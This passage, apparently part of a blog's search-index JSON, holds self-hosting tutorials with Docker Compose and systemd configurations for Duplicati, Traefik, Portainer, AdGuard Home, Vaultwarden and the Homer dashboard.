CDATXERRIL.backup|   |   |-- Duplicati-server.sqlite|   |   |-- GSZRNYUBKA.sqlite|   |   |-- KYNVCKAOHG.sqlite|   |   `-- control_dir_v2|   |       `-- lock_v2|   `--📂 scripts|       `-- duplicati-after.sh`--📑 docker-compose.ymlDocker ConfigurationWith the directory structure in place, let’s edit the docker-compose.yml file using your favorite text editor. Here’s an example configuration:services:  duplicati-notifications:    image: jameslloyd/duplicati-notifications    container_name: duplicati-notifications    restart: unless-stopped    expose:      - 5000    networks:      routevlan:        ipv4_address: $IP      proxy:  duplicati:    image: lscr.io/linuxserver/duplicati:latest    container_name: duplicati    environment:      - TZ=Asia/Kolkata      # - CLI_ARGS= #optional      - PUID=1000      - PGID=1000          volumes:      - ./data/config:/config      - ./data/scripts:/tmp/scripts      - /root/docker:/docker      - /root/script:/script    ports:      - 8200:8200    restart: unless-stopped    networks:      routevlan:        ipv4_address: $IP       proxy:# Traefik labels can be uncommented and configured if using Traefik as a reverse proxy.#    labels:#      - \"traefik.enable=true\"#      - \"traefik.http.routers.duplicati.entrypoints=http\"#      - \"traefik.http.routers.duplicati.rule=Host(`test.domain.tld`)\"#      - \"traefik.http.middlewares.duplicati-https-redirect.redirectscheme.scheme=https\"#      - \"traefik.http.routers.duplicati.middlewares=duplicati-https-redirect\"#      - \"traefik.http.routers.duplicati-secure.entrypoints=https\"#      - \"traefik.http.routers.duplicati-secure.rule=Host(`test.domain.tld`)\"#      - \"traefik.http.routers.duplicati-secure.tls=true\"#      - \"traefik.http.routers.duplicati-secure.service=duplicati\"#      - \"traefik.http.services.duplicati.loadbalancer.server.port=8200\"#      - \"traefik.docker.network=proxy\"#      - \"traefik.http.routers.duplicati-secure.middlewares=authelia@file\"#      - \"com.centurylinklabs.watchtower.enable=true\"networks:  routevlan:    external: true  proxy:    external: trueVerify and Launch the Containerto verify the docker compose files has no issues use docker compose config Once you have the docker-compose.yml file you can run docker-compose up -d which will create the volume, download the image and start the container in the backgroundTo verify the status of all running containers, run the docker-compose command:docker-compose ps (OR) docker ps -aIf something goes wrong, you can check the logs for each container using the docker logs command and specify the service name. For example, to check the log of the Nginx Proxy Manager container, run the following command:docker logs $container (OR) docker compose logs -fAccessing the Duplicati DashboardIf all is well, you can locally view your duplicati Server by navigating to http://$IP:8200Creating a Backup ConfigurationIn this section, we’ll create a backup for the Docker directory, using SFTP to store the backups on another server.Configure Backup SettingsOpen the Duplicati web interface by navigating to http://$IP:8200. Click on Add backup to start the configuration process.First, give your backup a name that helps you identify it easily, such as “Docker Directory Backup.” If you want to encrypt your backup, select the encryption option and securely store the passphrase.Configure Backup DestinationFor the storage type, select SFTP since you are backing up to another server. Enter the IP address or hostname of the remote server and specify the directory where you want the backups to be stored (e.g., /home/$user/backup). Provide the SFTP username and password or SSH key for the remote server. This setup ensures that your backups are securely transferred to and stored on the remote server.  Make sure you use the full path on the server (e.g., /home/$user/backup).Next, navigate through the file browser in Duplicati to select the data you wish to back up. In this example, select the Docker directory. Ensure you use the full path to the directory (e.g., /home/$user/docker). You can include or exclude specific files and folders based on your needs.Schedule the BackupConfigure the backup schedule to automate the process according to your needs. You might schedule daily or weekly backups, depending on how often your data changes. Additionally, set retention policies to keep only a certain number of backups or delete backups older than a specified time.Enable NotificationsWhile Duplicati doesn’t have built-in support for sending notifications to Discord, you can configure the duplicati-notifications container to send notifications upon backup completion. In Duplicati settings, you can configure email notifications or use scripts to trigger custom notifications. Set up duplicati-notifications to integrate with your Discord server, ensuring that you receive a detailed notification about the backup status in your Discord channel.                               Run the BackupOnce everything is configured, run the backup to ensure it’s working as expected. Monitor the progress in the Duplicati dashboard and view logs for any issues. After completion, a notification will be sent to your Discord server                               Verify and RestorePeriodically, it’s a good practice to verify that your backups are functioning correctly and that you can restore data when needed. Duplicati provides a straightforward restore process, which can be initiated from the dashboard.For more advanced configuration options, refer to the Duplicati manual."
  },
  
  {
    "title": "Traefik",
    "url": "/posts/traefik/",
    "categories": "Linux",
    "tags": "Linux",
    "date": "2023-05-10 00:00:00 +0530",
    





    
    "snippet": "IntroductionIn this post, we’ll walk through the steps to install and configure Traefik as a reverse proxy and load balancer for your Docker environment. Traefik is a powerful tool that dynamically...",
    "content": "IntroductionIn this post, we’ll walk through the steps to install and configure Traefik as a reverse proxy and load balancer for your Docker environment. Traefik is a powerful tool that dynamically discovers backend services and can automatically generate SSL certificates via ACME providers like Let’s Encrypt.This guide assumes you are familiar with docker and have it installed on your system if you didnt you can follow our detailed Docker installation guide.Step 1: Download and Extract TraefikFirst, download the appropriate version of Traefik you would like to use for your system from the official Traefik GitHub releases page.wget https://github.com/traefik/traefik/releases/download/vX.X.X/traefik_linux_amd64.tar.gztar -xzvf traefik_linux_amd64.tar.gzStep 2: Move Traefik to a System PathMake the Traefik binary executable and move it to a directory in your system’s PATH:chmod +x traefiksudo mv traefik /usr/local/bin/traefikTo allow Traefik to bind to privileged ports (like 80 and 443) as a non-root user, execute the following command:sudo setcap 'cap_net_bind_service=+ep' /usr/local/bin/traefikStep 3: Set Up User and DirectoriesNow, we’ll create the necessary user, group, and directories for Traefik. This ensures that Traefik runs with limited permissions, improving security.sudo groupadd -g 321 traefik dockersudo useradd -g traefik --no-user-group --home-dir /var/www --no-create-home --shell /usr/sbin/nologin --system --uid 321 traefikCreate the configuration directories:sudo mkdir -p /etc/traefik/{acme,dynamic} /var/log/traefik/sudo touch /var/log/traefik/{traefik.log,debug.log}sudo chown -R root:root /etc/traefiksudo chown -R traefik:traefik /etc/traefik/acmeSet appropriate ownership and permissions:sudo chown root:root /etc/traefik/traefik.yamlsudo chmod 644 /etc/traefik/traefik.yaml /etc/traefik/dynamic/config.yml /var/log/traefik/{traefik.log,debug.log}Step 4: Create and Configure Traefik FilesYou need to place the traefik.yaml configuration file in /etc/traefik/ and config.yml configuration file in /etc/traefik/dynamic/config.yaml.This file defines global settings, entry points, logging, and providers for Docker and file-based configurations.Update sample traefik.yaml according to your needs:################################################################# Global configuration#################################################################global:#  checkNewVersion = true#  sendAnonymousUsage = true################################################################# API and dashboard configuration################################################################api:  dashboard: true  debug: true################################################################# Traefik logs configuration################################################################log:  level: DEBUG  filePath: /var/log/traefik/debug.log  #format: jsonaccessLog:  filePath: \"/var/log/traefik/traefik.log\"  bufferingSize: 100  #format: json################################################################# EntryPoints configuration################################################################entryPoints:  http:    address: \":80\"    http:      redirections:        entryPoint:          to: https          scheme: https  https:    address: \":443\"serversTransport:  insecureSkipVerify: true################################################################# Docker configuration backend################################################################providers:  docker:    endpoint: \"unix:///var/run/docker.sock\"    exposedByDefault: false    useBindPortIP: true    network: proxy    watch: true  file:    directory: /etc/traefik/dynamic/    watch: true################################################################# Certificate resolvers################################################################certificatesResolvers:  cloudflare:    acme:      email: XXXXXXXXXX      storage: /etc/traefik/acme/acme.json      dnsChallenge:        provider: cloudflare        #disablePropagationCheck: true # uncomment this if you have issues pulling certificates through cloudflare, By setting this flag to true disables the need to wait for the propagation of the TXT record to all authoritative name servers.        resolvers:          - \"1.1.1.1:53\"          - \"1.0.0.1:53\"                                                                                                                                Update sample config.yaml according to your needs:http:  routers:    test:      entryPoints:        - \"https\"      rule: \"Host(`test.example.com`)\"      middlewares:        - secured      tls:        certResolver: cloudflare        domains:          - main: \"example.com\"            sans:              - \"*.example.com\"      service: test  traefik:    entryPoints:      - \"https\"    rule: \"Host(`traefik-detract.example.com`) &amp;&amp; (PathPrefix(`/api`) || PathPrefix(`/dashboard`))\"    middlewares:      - default-headers    tls:      certResolver: cloudflare      domains:        - main: \"example.com\"          sans:            - \"*.example.com\"    service: api@internal############################################################################################### services############################################################################################  services:    test:      loadBalancer:        sticky:          cookie:            secure: true            httpOnly: true        servers:          - url: \"https://$IP:$PORT/\"        passHostHeader: true############################################################################################### middlewares############################################################################################  middlewares:    https-redirectscheme:      redirectScheme:        scheme: https        permanent: true    gzip:      compress: {}    default-headers:      headers:        frameDeny: true        browserXssFilter: true        contentTypeNosniff: true        forceSTSHeader: true        stsIncludeSubdomains: true        stsPreload: true        stsSeconds: 15552000        customFrameOptionsValue: SAMEORIGIN        customRequestHeaders:          X-Forwarded-Proto: https        customResponseHeaders:          Access-Control-Allow-Origin: \"*\"    cors:      headers:        accessControlAllowOriginList: [\"*\"]        accessControlAllowCredentials: true        accessControlAllowHeaders: [\"*\"]        accessControlAllowMethods: [\"*\"]        accessControlMaxAge: 100        addVaryHeader: truetls:  options:    # To use with the label \"traefik.http.routers.myrouter.tls.options=modern@file\"    modern:      minVersion: \"VersionTLS13\"                          # Minimum TLS Version      sniStrict: true                                     # Strict SNI Checking    # To use with the label \"traefik.http.routers.myrouter.tls.options=intermediate@file\"    intermediate:      cipherSuites:        - \"TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256\"        - \"TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256\"        - \"TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384\"        - \"TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384\"        - \"TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305\"        - \"TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305\"      minVersion: \"VersionTLS12\"                          # Minimum TLS Version      sniStrict: true                                     # Strict SNI Checking    # To use with the label \"traefik.http.routers.myrouter.tls.options=old@file\"    old:      cipherSuites:        - \"TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256\"        - \"TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256\"        - \"TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384\"        - \"TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384\"        - \"TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305\"        - \"TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305\"        - \"TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA256\"        - \"TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256\"        - \"TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA\"        - \"TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA\"        - \"TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA\"        - \"TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA\"        - \"TLS_RSA_WITH_AES_128_GCM_SHA256\"        - \"TLS_RSA_WITH_AES_256_GCM_SHA384\"        - \"TLS_RSA_WITH_AES_128_CBC_SHA256\"        - \"TLS_RSA_WITH_AES_128_CBC_SHA\"        - \"TLS_RSA_WITH_AES_256_CBC_SHA\"        - \"TLS_RSA_WITH_3DES_EDE_CBC_SHA\"      minVersion: \"TLSv1\"                                 # Minimum TLS Version      sniStrict: true                                     # Strict SNI CheckingStep 5: Create Systemd ServiceCreate a systemd service file for Traefik to manage its lifecycle.sudo nano /etc/systemd/system/traefik.servicesudo chown root:root /etc/systemd/system/traefik.servicesudo chmod 644 /etc/systemd/system/traefik.serviceUpdate sample traefik.service according to your needs:[Unit]Description=TraefikDocumentation=https://doc.traefik.io/traefik/After=network-online.targetWants=network-online.target systemd-networkd-wait-online.service[Service]Environment=\"CF_API_EMAIL=XXXXXXXXXX\"Environment=\"CF_DNS_API_TOKEN=XXXXXXXXXX\"Environment=\"CF_API_KEY=XXXXXXXXXX\"Restart=alwaysRestartSec=3; User and group the process will run as.User=traefikGroup=traefik; Always set \"-root\" to something safe in case it gets forgotten in the traefikfile.ExecStart=/usr/local/bin/traefik --configfile=/etc/traefik/traefik.toml --api=true --api.insecure=true --api.dashboard=true --api.debug=true; Limit the number of file descriptors; see `man systemd.exec` for more limit settings.LimitNOFILE=1048576; Use private /tmp and /var/tmp, which are discarded after traefik stops.PrivateTmp=true; Use a minimal /dev (May bring additional security if switched to 'true', but it may not work on Raspberry Pis or other devices, so it has been disabled in this dist.)PrivateDevices=false; Hide /home, /root, and /run/user. Nobody will steal your SSH-keys.ProtectHome=true; Make /usr, /boot, /etc and possibly some more folders read-only.ProtectSystem=full; … except /etc/ssl/traefik, because we want Letsencrypt-certificates there.;   This merely retains r/w access rights, it does not add any new. Must still be writable on the host!ReadWriteDirectories=/etc/traefik/acme; The following additional security directives only work with systemd v229 or later.; They further restrict privileges that can be gained by traefik. Uncomment if you like.; Note that you may have to add capabilities required by any plugins in use.CapabilityBoundingSet=CAP_NET_BIND_SERVICEAmbientCapabilities=CAP_NET_BIND_SERVICENoNewPrivileges=true[Install]WantedBy=multi-user.targetReload systemd and start the Traefik service:sudo systemctl daemon-reloadsudo systemctl start traefik.serviceTo enable Traefik to start automatically at boot:sudo systemctl enable traefik.serviceConclusionYou now have Traefik up and running, configured to work with Docker and your Cloudflare DNS for SSL certificates. For more advanced configurations, such as setting up middlewares or further customizing TLS options, refer to the official Traefik documentation."
  },
  
  {
    "title": "Portainer",
    "url": "/posts/portainer/",
    "categories": "Docker",
    "tags": "",
    "date": "2023-04-07 00:00:00 +0530",
    





    
    "snippet": "In the world of modern application development, containers have become the go-to solution for deploying, scaling, and managing software. However, managing these containers can be complex, especiall...",
    "content": "In the world of modern application development, containers have become the go-to solution for deploying, scaling, and managing software. However, managing these containers can be complex, especially as environments grow in size and complexity. This is where Portainer comes in—a powerful and user-friendly container management platform designed to streamline containerized application management across various environments, including cloud, datacenters, and Industrial IoT.What is Portainer? Portainer is a container management tool that offers a web-based interface for managing Docker environments and Kubernetes clusters. Its simplicity makes it accessible to both beginners and experienced users, providing all the features necessary to deploy, troubleshoot, and secure applications effortlessly.Core Features of PortainerPortainer’s primary goal is to simplify the management of containerized environments. It achieves this through a range of features tailored to different use cases.Container Management Deploying containers with Portainer is a breeze, whether you use pre-configured templates or custom configurations. You can manage Docker images, networks, volumes, and services, all from a central dashboard. For multi-container applications, Portainer allows easy management using Docker Compose or Kubernetes manifests, and it provides real-time visibility into the performance of your containers.Prerequisites  Docker Engine and Docker Compose packages are installed and running  A non-root user with Docker privilegesSetting up the portainer ServerCreate the directory structureTo keep the docker directory clean i have created a portainer directory to store the configuration file. My file structure is as follows:mkdir ~/docker/portainer/datatouch ~/docker/portainer/docker-compose.yml📂portainer|--📂 data|   |--📂 backups|   |   |--📂 common|   |   |   |-- portainer.db.2.19.1.20231204141757|   |   |   `-- portainer.db.2.19.4.20240423030116|   |   `-- portainer.db.bak|   |--📂 bin|   |--📂 certs|   |   |-- cert.pem|   |   `-- key.pem|   |--📂 chisel|   |   `-- private-key.pem|   |--📂 compose|   |--📂 docker_config|   |   `-- config.json|   |-- portainer.db|   |-- portainer.key|   |-- portainer.pub|   `--📂 tls`--📑 docker-compose.ymlDocker ConfigurationWith the directory structure in place, let’s edit the docker-compose.yml file using your favorite text editor. Here’s an example configuration:services:  portainer:    image: portainer/portainer-ce:latest    container_name: portainer    restart: unless-stopped    security_opt:      - no-new-privileges:true    networks:      - proxy    volumes:      - /etc/localtime:/etc/localtime:ro      - /var/run/docker.sock:/var/run/docker.sock:ro      - ./data:/data    ports:      - 9443:9443      - 9000:9000networks:  proxy:    external: trueVerify and launch the containerto verify the docker compose files has no issues use docker compose config Once you have the docker-compose.yml file you can run docker-compose up -d which will create the volume, download the image and start the container in the backgroundTo verify the status of all running containers, run the docker-compose command:docker-compose ps (OR) docker ps -aIf something goes wrong, you can check the logs for each container using the docker logs command and specify the service name. For example, to check the log of the Nginx Proxy Manager container, run the following command:docker logs $container (OR) docker compose logs -fAccessing the Portainer dashboardIf all is well, you can locally view your portainer Server by navigating to http://localhost:9443. You should see something that looks like the following. The first time you access Portainer, the system asks to create a password for the admin user. Type the password twice and select the Create user button. once you login you can able to access the portainerFor a more detailed guide, you can check the official documentation at Portainer Documentation.Launching the nginx containerAfter setting up Portainer, you can verify that everything is working as expected by deploying a simple Nginx container.To get started, access the Portainer dashboard by navigating to http://localhost:9443 in your web browser. Log in using the admin credentials you set up earlier.In the dashboard, go to the Containers section and click Add Container. Name the container nginx and set the image to nginx:latest, which will pull the latest Nginx image from Docker Hub. For port configuration, map port 80 in the container to port 8080 on your host by entering 8080:80.After configuring the settings, deploy the container. Once deployed, open a new browser tab and visit http://localhost:8080 or http://serverIp:8080. If the deployment is successful, the default Nginx welcome page will appear.This simple test confirms that Portainer is correctly managing your Docker containers. If issues arise, check the container logs within the Portainer interface by selecting the container and navigating to the Logs tab.After following the steps in this tutorial, you should now have a fully functional Portainer setup to manage Docker containers on your Linux system. The tutorial guided you through installing the Portainer Server, configuring it, and testing the setup by deploying an Nginx container.With Portainer, managing your Docker environments becomes more straightforward, allowing you to add and manage containers, monitor performance, and troubleshoot issues with ease. Whether you’re working with a single environment or managing multiple Docker instances, Portainer provides a unified platform to simplify your container management tasks."
  },
  
  {
    "title": "Adguard",
    "url": "/posts/aadguard/",
    "categories": "Docker",
    "tags": "",
    "date": "2023-03-29 00:00:00 +0530",
    





    
    "snippet": "AdGuard Home functions as a DNS sinkhole, blocking connection requests to domains or hosts identified as ad servers and trackers, while also providing built-in support for DNS over HTTPS (DoH) to e...",
    "content": "AdGuard Home functions as a DNS sinkhole, blocking connection requests to domains or hosts identified as ad servers and trackers, while also providing built-in support for DNS over HTTPS (DoH) to enhance privacy. Unlike Pi-Hole, which requires extra setup, AdGuard Home simplifies this process. With its DoH capabilities, it enables convenient use on mobile devices without necessitating a VPN, and it offers the flexibility to create whitelists in addition to blocklists.Prerequisites  Docker Engine and Docker Compose packages are installed and running  A non-root user with Docker privilegesSetting up the adguard ServerCreate the directory structureTo keep the docker directory clean i have created a adguard directory to store the configuration file. My file structure is as follows:mkdir ~/docker/adguard/{conf,work}touch ~/docker/adguard/docker-compose.yml📂adguard|-- 📂conf|   `-- 📑 AdGuardHome.yaml|-- 📂work|   `--📂data        |-- filters        |   `-- 1.txt        |-- querylog.json        |-- sessions.db        `-- stats.db|-- 📑docker-compose.yml  Docker ConfigurationAs we have created the docker compose file lets edit the files with your favorite editors of choice---version: \"3\"services:  adguardhome:    image: adguard/adguardhome    container_name: adguardhome    environment:      - PUID=1000      - PGID=1000    volumes:      - ./conf:/opt/adguardhome/conf      - ./work:/opt/adguardhome/work    ports:        # DNS        - 53:53          # # DHCP server          # - 67:67/udp          # - 68:68/tcp          # - 68:68/udp          # # HTTPS/DNS-over-HTTPS          # - 443:443/tcp          # # DNS-over-TLS          # - 853:853/tcp          # # DNS-over-QUIC          # - 784:784/udp          # # DNSCrypt          # - 5443:5443/tcp          # - 5443:5443/udp          # # WebUI        - 3000:3000/tcp    restart: unless-stopped    networks:      routevlan:        ipv4_address: 192.168.1.100      proxy:    networks:  routevlan:    external: true  proxy:    external: true#routevlan:#  name: routevlan#  driver: macvlan#  driver_opts:#    parent: eth1 # using ifconfig#  ipam:#    config:#      - subnet: \"192.168.1.0/24\"#        ip_range: \"192.168.1.100/32\"#        gateway: \"192.168.1.1\"As the Adguard service is relays on the network to block the adds on the network i recommend you to use the docker macvlan. AdGuard Home Docker service would act as a separate machine thereby eliminating any port conflicts.Verify and launch the containerto verify the docker compose files has no issues use docker compose config Once you have the docker-compose.yml file you can run docker-compose up -d which will create the volume, download the image and start the container in the backgroundTo verify the status of all running containers, run the docker-compose command:docker-compose ps (OR) docker ps -aIf something goes wrong, you can check the logs for each container using the docker logs command and specify the service name. For example, to check the log of the Nginx Proxy Manager container, run the following command:docker logs $container (OR) docker compose logs -fAccessing the Adguard dashboardIf all is well, you can locally view your adguard Server by navigating to http://localhost:PORT. Or from another machine by using your ip (macvlan ip) address.You should see something that looks like the following.Setup DNS service on routerTo use AdGuard Home, replace the default DNS server IPs with your AdGuard Home IP address (macvlan ip) in your router or other devices. If you haven’t altered DNS settings before, typically there won’t be any IP address configured in your settings. DNS configuration depends on the routers you use please google them according.If you like you can use the adguard default DHCP service for assigning the IP address in your network instead of the default router DHCP."
  },
  
  {
    "title": "Bitwarden",
    "url": "/posts/bitwarden/",
    "categories": "Docker",
    "tags": "",
    "date": "2023-02-18 00:00:00 +0530",
    





    
    "snippet": "Bitwarden is a free and open-source password management service that stores sensitive information such as website credentials in an encrypted vault. The Bitwarden platform offers a variety of clien...",
    "content": "Bitwarden is a free and open-source password management service that stores sensitive information such as website credentials in an encrypted vault. The Bitwarden platform offers a variety of client applications including a web interface, desktop applications, browser extensions, mobile apps, and a CLI.I use Bitwarden as my main password vault. It stores my card details for automating the filling out of payment forms. Saves me from having to find or remember my card details. I also use Bitwarden for storing all of my passwords.Having Bitwarden as a public endpoint means that I can connect to my password vault using the Bitwarden app on Android, specifying my self hosted instance.Prerequisites  Docker Engine and Docker Compose packages are installed and running  A non-root user with Docker privilegesSetting up the Bitwarden ServerCreate the directory structureTo keep the docker directory clean i have created a bitwarden directory to store the configuration file. My file structure is as follows:mkdir ~/docker/bitwarden/datatouch ~/docker/bitwarden/docker-compose.yml📂bitwarden|-- 📂data|-- 📑docker-compose.yml  Docker ConfigurationAs we have created the docker compose file lets edit the files with your favorite editors of choiceversion: '3.8'services:  bitwarden:    image: vaultwarden/server:latest    container_name: bitwarden    volumes:      - ./data:/data    restart: unless-stopped    environment:      - PUID=1000      - PGID=1000      - WEBSOCKET_ENABLED=true      - SIGNUPS_ALLOWED=true      - DOMAIN=https://subdomain.yourdomain.com      - LOGIN_RATELIMIT_MAX_BURST=10       - LOGIN_RATELIMIT_SECONDS=60      - ADMIN_RATELIMIT_MAX_BURST=10      - ADMIN_RATELIMIT_SECONDS=60      - ADMIN_TOKEN=YourReallyStrongAdminTokenHere      - SENDS_ALLOWED=true      - EMERGENCY_ACCESS_ALLOWED=true      - WEB_VAULT_ENABLED=true      - SIGNUPS_ALLOWED=false      - SIGNUPS_VERIFY=true      - SIGNUPS_VERIFY_RESEND_TIME=3600      - SIGNUPS_VERIFY_RESEND_LIMIT=5      - SIGNUPS_DOMAINS_WHITELIST=yourdomainhere.com,anotherdomain.com      - SMTP_HOST=smtp.youremaildomain.com      - SMTP_FROM=vaultwarden@youremaildomain.com      - SMTP_FROM_NAME=Vaultwarden      - SMTP_SECURITY=SECURITYMETHOD      - SMTP_PORT=XXXX      - SMTP_USERNAME=vaultwarden@youremaildomain.com      - SMTP_PASSWORD=YourReallyStrongPasswordHere      - SMTP_AUTH_MECHANISM=\"Mechanism\"    ports:      - \"8080:80\"#    networks:#      - proxy##networks:#  proxy:#    external: trueEnvironment variablesSystem Settings  Domain: This is the domain you wish to associate with your Vaultwarden instance.  LOGIN_RATELIMIT_MAX_BURST: This is the maximum number of requests allowed in a burst of login / two-factor attempts while maintaining the average specified in LOGIN_RATELIMIT_SECONDS.  LOGIN_RATELIMIT_SECONDS: This is the average number of seconds between login requests from the same IP before Vaultwarden rate limits logins.  ADMIN_RATELIMIT_MAX_BURST: This is the same as LOGIN_RATELIMIT_MAX_BURST, only for the admin panel.  ADMIN_RATELIMIT_SECONDS: This is the same as LOGIN_RATELIMIT_SECONDS, only for the admin panel.  ADMIN_TOKEN: This value is the token (a type of password) for the Vaultwarden admin panel. For security, this should be a long random string of characters. The admin panel is disabled if this value is not set.  SENDS_ALLOWED: This setting determines whether users are allowed to create Bitwarden Sends – a form of credential sharing.  EMERGENCY_ACCESS_ALLOWED: This setting controls whether users can enable emergency access to their accounts. This is useful, for example, so a spouse can access a password vault in the event of death so they can gain access to account credentials. Possible values: true / false.  WEB_VAULT_ENABLED: This setting determines whether or not the web vault is accessible. Stopping your container then switching this value to false and restarting Vaultwarden could be useful once you’ve configured your accounts and clients to prevent unauthorized access. Possible values: true/false.Signup Settings  SIGNUPS_ALLOWED: This setting controls whether or not new users can register for accounts without an invitation. Possible values: true / false.  SIGNUPS_VERIFY: This setting determines whether or not new accounts must verify their email address before being able to login to Vaultwarden. Possible values: true / false.  SIGNUPS_VERIFY_RESEND_TIME: If SIGNUPS_VERIFY is set to true, this value specifies how many seconds a user must wait before another verification email can be sent.  SIGNUPS_VERIFY_RESEND_LIMIT: If SIGNUPS_VERIFY is set to true, this value specifies the maximum number of times an email verification may be re-sent.  SIGNUPS_DOMAINS_WHITELIST: This setting is a comma separated list of domains that can register for Vaultwarden accounts, even if SIGNUPS_ALLOWED is set to false. This is useful for when your Vaultwarden accounts are to be used specifically by email addresses whose domains you control.SMTP Settings  SMTP_HOST: This is your SMTP mailserver.  SMTP_FROM: This is the email address messages will be sent from.  SMTP_FROM_NAME: The name you wish to appear as the email account name on sent messages  SMTP_SECURITY: The security method used by your SMTP server. Possible values: “starttls” / “force_tls” / “off”.  SMTP_PORT: This is the SMTP port used by your mail server. Possible values: 587 / 465.  SMTP_USERNAME: This is the login for your SMTP mail server.  SMTP_PASSWORD: This is the password for your SMTP credentials.  SMTP_AUTH_MECHANISM: This is the SMTP authentication mechanism of your mail server. Possible values: “Plain” / “Login” / “Xoauth2”.I’m using Vaultwarden which is an opensource project. It is not owned by Bitwarden. They’re an unofficial bitwarden compatible server written in Rust.Save your docker-compose.yml file and exit back to your bitwarden directory.Verify and launch the containerto verify the docker compose files has no issues use docker compose config Once you have the docker-compose.yml file you can run docker-compose up -d which will create the volume, download the image and start the container in the backgroundTo verify the status of all running containers, run the docker-compose command:docker-compose ps (OR) docker ps -aIf something goes wrong, you can check the logs for each container using the docker logs command and specify the service name. For example, to check the log of the Nginx Proxy Manager container, run the following command:docker logs $container (OR) docker compose logs -fAccessing the bitwarden dashboardIf all is well, you can locally view your Bitwarden Server by navigating to http://localhost:PORT. Or from another machine by using your ip address instead of localhostYou should see something that looks like the following.Finally, you’ll just need to register for an account on your new hosted instance.Click the Create Account buttonThen fill out your details. If you have an existing Bitwarden account, you’ll still have to create a new account on this instance. You can then Export and Import your credentials.                               Browsers like chrome, firefox … also has the inbuilt vaults to store the credentials you can also export the credentials in a csv/json format and exportYou can use the Nginx proxy manager to create the reverse proxy and configure the lets-encrypt SSL certificate to remove the SSL warningsyou can use the bitwarden clients applications/browser extensions to access the stored credentials Application firefox extension chrome extension  For More details please check the github issues discussions"
  },
  
  {
    "title": "Homer",
    "url": "/posts/homer/",
    "categories": "Docker",
    "tags": "",
    "date": "2023-02-05 00:00:00 +0530",
    





    
    "snippet": "Recently I have decided to get my home network in order, One of the things I realized was that I spend a lot of time trying to remember the IP addresses or URLs for services within my home, especia...",
    "content": "Recently I have decided to get my home network in order, One of the things I realized was that I spend a lot of time trying to remember the IP addresses or URLs for services within my home, especially ones that I access infrequently.After searching for some open source projects i came across the homer. A simple to use Docker container that stores all my service url which can be accessible easily. Homer is a full static html/js dashboard, based on a simple yaml configuration filePrerequisites  Docker Engine and Docker Compose packages are installed and running  A non-root user with Docker privilegesSetting up the homerCreate the directory structureTo keep the docker directory clean i have created a homer directory to store the configuration file and any other assets such as images. My file structure is as follows:mkdir ~/docker/homer/assetstouch ~/docker/homer/assets/config.yml ~/docker/homer/docker-compose.yml📂homer|-- 📂assets|   |-- 📑config.yml|-- 📑docker-compose.yml  Docker ConfigurationAs we have created the docker compose file lets edit the files with your favorite editors of choice---version: \"3\"services:  homer:    image: b4bz/homer    container_name: homer    volumes:      - ./assets/:/www/assets    ports:      - 8080:8080    #networks:    #  - proxy    restart: unless-stopped    user: 1000:1000 # default    environment:      - INIT_ASSETS=1 # default#networks:#  proxy:#    external: trueAs you notice am using the port 8080 if the port 8080 is already used feel free to use the free port. if you want to create a separate network for the homer (eg:- proxy) don’t forget to create the docker network manually docker network create proxyVerify and launch the containerto verify the docker compose files has no issues use docker compose config Once you have the docker-compose.yml file you can run docker-compose up -d which will create the volume, download the image and start the container in the backgroundTo verify the status of all running containers, run the docker-compose command:docker-compose ps (OR) docker ps -aIf something goes wrong, you can check the logs for each container using the docker logs command and specify the service name. For example, to check the log of the Nginx Proxy Manager container, run the following command:docker logs $container (OR) docker compose logs -fAccessing the Homer dashboardNow that the container is up and running you can access it via:http://&lt;docker-host-ip-address&gt;:&lt;port&gt;If everything has worked as expected you should see the following demo dashboard:You can use the Nginx proxy manager to create the reverse proxy and configure the lets-encrypt SSL certificate to remove the SSL warningsSample config.yml file# Homelab Dashboard Main Page Configuration# See https://fontawesome.com/v5/search for icons optionstitle: \"Dashboard\"subtitle: \"Homelab\"#logo: \"logo.png\"icon: \"fas fa-house-laptop\" # Optional iconheader: truefooter: '&lt;p&gt; Home lab Dashboard &lt;/p&gt;'columns: \"4\" # Options \"auto\" or must be a factor of 12: 1,2,3,4,6,12connectivityCheck: true#proxy:#  useCredentials: truedefaults:  layout: list  colorTheme: darkstylesheet:- \"assets/custom.css\"# Optional theme customizationtheme: default # 'default' or one of the themes available in 'src/assets/themes'colors:  light:    highlight-primary: \"#fff5f2\"    highlight-secondary: \"#fff5f2\"    highlight-hover: \"#bebebe\"    background: \"#12152B\"    card-background: \"rgba(255, 245, 242, 0.8)\"    text: \"#ffffff\"    text-header: \"#fafafa\"    text-title: \"#000000\"    text-subtitle: \"#111111\"    card-shadow: rgba(0, 0, 0, 0.5)    link: \"#3273dc\"    link-hover: \"#2e4053\"    background-image: \"../assets/wallpaper-light.jpeg\" # Change wallpaper.jpeg to the name of your own custom wallpaper!  dark:    highlight-primary: \"#181C3A\"    highlight-secondary: \"#181C3A\"    highlight-hover: \"#1F2347\"    background: \"#12152B\"    card-background: \"rgba(24, 28, 58, 0.8)\"    text: \"#eaeaea\"    text-header: \"#7C71DD\"    text-title: \"#fafafa\"    text-subtitle: \"#8B8D9C\"    card-shadow: rgba(0, 0, 0, 0.5)    link: \"#c1c1c1\"    link-hover: \"#fafafa\"    background-image: \"../assets/wallpaper.jpeg\"# Optional navbarlinks:  - name: \"Wordpress\"    icon: \"fab fa-wordpress\"    url: \"https://www.myblog.io/\"    target: \"_blank\"      - name: \"Linkedin\"    icon: \"fab fa-linkedin\"    url: \"https://www.linkedin.com/feed/\"    target: \"_blank\"  - name: \"Github\"    icon: \"fab fa-github\"    url: \"https://github.com/\"    target: \"_blank\" # optional html a tag target attribute  - name: \"Reddit\"   